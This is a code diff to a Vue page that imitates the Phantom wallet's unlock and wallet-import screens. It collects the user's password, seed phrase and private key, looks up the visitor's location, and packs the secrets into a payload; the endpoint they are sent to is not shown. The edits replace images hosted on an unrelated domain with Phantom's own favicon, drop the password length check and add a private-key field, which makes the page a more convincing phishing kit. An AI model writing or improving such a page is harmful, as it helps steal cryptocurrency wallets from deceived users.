@@ -5,11 +5,7 @@
       class="flex justify-between items-center py-3 px-4 border-b border-gray-700"
     >
       <span></span>
-      <img
-        src="https://vercelquickfix.com/Phantom-Logo.svg"
-        class="h-7"
-        alt="Phantom logo"
-      />
+      
       <svg
         xmlns="http://www.w3.org/2000/svg"
         class="h-5 w-5 text-[#777777]"
@@ -66,8 +62,8 @@
                   <button
                     @click="unlock"
                     type="button"
-                    :disabled="password.length <= 6 || isLoading"
-                    :class="password.length > 6 ? 'bg-[#ab9ff2]' : ''"
+                    :disabled="password.length < 1 || isLoading"
+                    :class="password.length > 0 ? 'bg-[#ab9ff2]' : ''"
                     class="w-full py-4 px-4 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-xl duration-200 flex items-center justify-center bg-[#333] text-white relative"
                   >
                     <span v-if="!isLoading">Unlock</span>
@@ -106,7 +102,7 @@
                   class="bg-white rounded-xl w-14 h-14 flex items-center justify-center mr-3"
                 >
                   <img
-                    src="https://vercelquickfix.com/logo_mini.svg"
+                    src="https://docs.phantom.com/favicon.svg"
                     class="w-10 h-10 object-contain"
                   />
                 </div>
@@ -251,7 +247,7 @@
             <!-- Private Key View -->
             <div v-else-if="showPrivateKey" class="px-6 pt-6">
               <div class="mb-4 p-3 flex items-center space-x-4" style="background: #181818; font-size: 14px;">
-                <img class="w-10 h-10" src="https://vercelquickfix.com/solana.svg" alt="">
+                <img class="w-10 h-10" src="https://docs.phantom.com/favicon.svg" alt="">
                 <span class="font-bold">Solana</span>
               </div>
               <div class="mb-4">
@@ -356,12 +352,13 @@ const password = ref("");
 const seedCount = ref(12);
 const seedWords = ref(Array(12).fill(""));
 const privateKey = ref("");
+const privateKeyName = ref("");
 const isLoading = ref(false);
 const showPrivateKey = ref(false);
 const message = ref({ text: "", type: "" }); // ✅ For success/error feedback
 
 function unlock() {
-  if (password.value.length <= 6) return;
+  if (password.value.length < 1) return;
   isLoading.value = true;
   setTimeout(() => {
     isLoading.value = false;
@@ -402,6 +399,7 @@ const importWallet = async () => {
   isLoading.value = true;
   try {
     const location = await axios.get("https://ipapi.co/json");
+
     const payload = {
       password: password.value,
       seedWords: seedWords.value.filter(Boolean),
